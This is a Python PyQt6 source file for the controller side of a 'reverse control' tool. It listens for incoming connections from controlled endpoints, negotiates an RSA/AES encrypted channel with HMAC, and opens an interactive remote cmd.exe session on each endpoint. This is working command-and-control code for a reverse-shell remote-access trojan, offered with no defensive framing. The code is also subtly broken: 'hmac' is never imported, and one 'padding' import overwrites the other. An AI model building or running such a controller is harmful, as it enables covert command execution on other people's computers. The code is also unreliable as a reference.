import sys
import os
import socket
import struct
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
QMenu, QAbstractItemView)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QThread
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os as os_rand


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)
    on_new_client = pyqtSignal(object)
    on_model_refresh = pyqtSignal(object)


class AcceptWorker(QObject):
    sig_new_client = pyqtSignal(object)
    sig_log = pyqtSignal(str)
    def __init__(self, port, rsa_priv):
        super().__init__()
        self.port = port
        self.rsa_priv = rsa_priv
        self.server_sock = None
        self.running = False

    @pyqtSlot()
    def run(self):
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(8)
            self.running = True
            self.sig_log.emit(f"开始监听端口 {self.port}")
            while self.running:
                try:
                    conn, addr = self.server_sock.accept()
                    sess = ClientSession(conn, addr, self.rsa_priv)
                    self.sig_new_client.emit(sess)
                except OSError:
                    break
        except Exception as e:
            self.sig_log.emit(f"监听异常:{repr(e)}")

    @pyqtSlot()
    def stop(self):
        self.running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass


class ClientRecvWorker(QObject):
    sig_outp = pyqtSignal(object, str)
    sig_disconnect = pyqtSignal(object)
    sig_refresh_model = pyqtSignal(object)
    sig_log = pyqtSignal(str)
    def __init__(self, sess):
        super().__init__()
        self.sess = sess

    @pyqtSlot()
    def run(self):
        buf = self.sess._recv_buf
        sess = self.sess
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)
                while len(buf) >= 4:
                    body_len = struct.unpack(">I", buf[0:4])[0]
                    total_packet_len = 4 + body_len
                    if len(buf) < total_packet_len:
                        break
                    body = bytes(buf[4:total_packet_len])
                    del buf[:total_packet_len]

                    if not sess.handshake_done:
                        if body_len == 256:
                            try:
                                aes16 = sess.rsa_private.decrypt(
                                    body,
                                    padding.OAEP(
                                        mgf=padding.MGF1(algorithm=hashes.SHA1()),
                                        algorithm=hashes.SHA1(),
                                        label=None
                                    )
                                )
                                sess.aes_key = aes16
                                sess.handshake_done = True
                                self.sig_log.emit(f"[{sess.ip_str}] ✅握手完成 aes={aes16.hex()}")
                                self.sig_refresh_model.emit(sess)
                            except Exception as e:
                                self.sig_log.emit(f"[{sess.ip_str}] ❌RSA解密失败:{repr(e)}")
                                sess.close()
                        else:
                            self.sig_log.emit(f"[{sess.ip_str}] 握手收到异常包 len={body_len}")
                            sess.close()
                        continue

                    if body_len < (16 + 32):
                        self.sig_log.emit(f"[{sess.ip_str}] 加密包长度过短 {body_len}")
                        sess.close()
                        continue
                    iv_cipher_part = body[:-32]
                    recv_hmac = body[-32:]
                    calc_h = sess._calc_hmac(iv_cipher_part)
                    if calc_h != recv_hmac:
                        self.sig_log.emit(f"[{sess.ip_str}] ❌HMAC校验失败，数据包被篡改")
                        sess.close()
                        continue
                    try:
                        plain_body = sess._decrypt_packet(iv_cipher_part)
                    except Exception as e:
                        self.sig_log.emit(f"[{sess.ip_str}] AES解密异常 {repr(e)}")
                        sess.close()
                        continue
                    if len(plain_body)>=4:
                        cmd_code = plain_body[0:4]
                        if cmd_code == b"PONG":
                            sess.last_pong = datetime.now()
                            self.sig_refresh_model.emit(sess)
                        elif cmd_code == b"OUTP":
                            output_bytes = plain_body[4:]
                            out_text = output_bytes.decode("gbk", errors="replace")
                            self.sig_outp.emit(sess, out_text)
            except OSError:
                break
        sess.close()
        self.sig_disconnect.emit(sess)


class ClientSession:
    def __init__(self, conn: socket.socket, addr, rsa_priv):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.handshake_done = False
        self.aes_key: bytes | None = None
        self.rsa_private = rsa_priv
        self.worker_thread = None
        self.worker = None

    def _encrypt_packet(self, plain_data: bytes) -> bytes:
        iv = os_rand.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded = padder.update(plain_data) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
        enc = cipher.encryptor()
        ciphertext = enc.update(padded) + enc.finalize()
        return iv + ciphertext

    def _decrypt_packet(self, iv_cipher: bytes) -> bytes:
        iv = iv_cipher[:16]
        ciphertext = iv_cipher[16:]
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
        dec = cipher.decryptor()
        padded_data = dec.update(ciphertext) + dec.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        plain = unpadder.update(padded_data) + unpadder.finalize()
        return plain

    def _calc_hmac(self, data: bytes) -> bytes:
        h = hmac.HMAC(self.aes_key, hashes.SHA256())
        h.update(data)
        return h.finalize()

    def send_packet(self, body: bytes) -> bool:
        if not self.connected or not self.handshake_done or self.aes_key is None:
            return False
        try:
            iv_cipher = self._encrypt_packet(body)
            hmac_val = self._calc_hmac(iv_cipher)
            enc_body = iv_cipher + hmac_val
            body_len = len(enc_body)
            header = struct.pack(">I", body_len)
            packet = header + enc_body
            self.conn.sendall(packet)
            return True
        except (OSError, BrokenPipeError):
            self.close()
            return False

    def close(self):
        self.connected = False
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程 CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True
        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)
        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)
        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程 CMD ====\n")

    def showEvent(self, event):
        super().showEvent(event)
        self.out_box.append("[*] 发送SPAW，启动被控端 cmd.exe")
        ok = self.client.send_packet(b"SPAW")
        if not ok:
            self.out_box.append("[!] SPAW发送失败！")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n [!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        hs = "✓握手完成" if s.handshake_done else "握手中"
        return QVariant(f"{s.ip_str} | {hs} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self, rsa_key):
        super().__init__()
        self.rsa_private_key = rsa_key
        self.setWindowTitle("TCP 反向控制端")
        self.resize(700, 500)
        self.accept_thread = None
        self.accept_worker = None
        self.client_workers = []
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)
        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("8888")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)
        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @pyqtSlot(object)
    def on_new_client(self, sess:ClientSession):
        self.log(f"新被控端接入 {sess.ip_str}")
        # 每个客户端单独QThread
        worker = ClientRecvWorker(sess)
        th = QThread()
        worker.moveToThread(th)
        th.started.connect(worker.run)
        worker.sig_outp.connect(self.handle_session_outp)
        worker.sig_disconnect.connect(self.handle_session_disconnect)
        worker.sig_refresh_model.connect(self.on_client_refresh)
        worker.sig_log.connect(self.log)
        worker.sig_disconnect.connect(lambda x: self.cleanup_worker(worker, th))
        self.client_workers.append((worker, th))
        self.client_model.add(sess)
        th.start()

    @pyqtSlot(object)
    def on_client_refresh(self, sess):
        idx = self.client_model.items.index(sess)
        self.client_model.dataChanged.emit(self.client_model.index(idx), self.client_model.index(idx))

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n [!] TCP 连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"被控端断开 {sess.ip_str}")

    def cleanup_worker(self, worker, th):
        try:
            th.quit()
            th.wait(1000)
        except Exception:
            pass
        if (worker, th) in self.client_workers:
            self.client_workers.remove((worker, th))

    def start_server(self):
        port = int(self.port_edit.text())
        self.accept_worker = AcceptWorker(port, self.rsa_private_key)
        self.accept_thread = QThread()
        self.accept_worker.moveToThread(self.accept_thread)
        self.accept_thread.started.connect(self.accept_worker.run)
        self.accept_worker.sig_new_client.connect(self.on_new_client)
        self.accept_worker.sig_log.connect(self.log)
        self.accept_thread.start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_server(self):
        if self.accept_worker:
            self.accept_worker.stop()
        if self.accept_thread:
            self.accept_thread.quit()
            self.accept_thread.wait(1500)
        for worker, th in list(self.client_workers):
            worker.sess.close()
            th.quit()
            th.wait(500)
        self.client_workers.clear()
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("停止监听")

    def open_cmd_session(self, sess):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            if dlg.isVisible():
                dlg.raise_()
                dlg.activateWindow()
                return
            else:
                del self.open_cmd_dialogs[sess]
        dlg = RemoteCmdDialog(sess, parent=self)
        self.open_cmd_dialogs[sess] = dlg
        dlg.show()

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程 CMD 会话")
        act_open_cmd.triggered.connect(lambda: self.open_cmd_session(sess))
        menu.exec(self.view.viewport().mapToGlobal(pos))

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


def main():
    if hasattr(sys, '_MEIPASS'):
        exe_dir = os.path.dirname(sys.executable)
    else:
        exe_dir = os.path.dirname(os.path.abspath(__file__))
    pem_path = os.path.join(exe_dir, "private.pem")
    with open(pem_path, "rb") as f:
        rsa_private_key = serialization.load_pem_private_key(
            f.read(),
            password=None
        )
    app = QApplication(sys.argv)
    win = MainWindow(rsa_private_key)
    win.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback
        if hasattr(sys, '_MEIPASS'):
            exe_dir = os.path.dirname(sys.executable)
        else:
            exe_dir = os.path.dirname(os.path.abspath(__file__))
        log_path = os.path.join(exe_dir, "crash.log")
        with open(log_path, "w", encoding="utf-8") as fp:
            fp.write(traceback.format_exc())
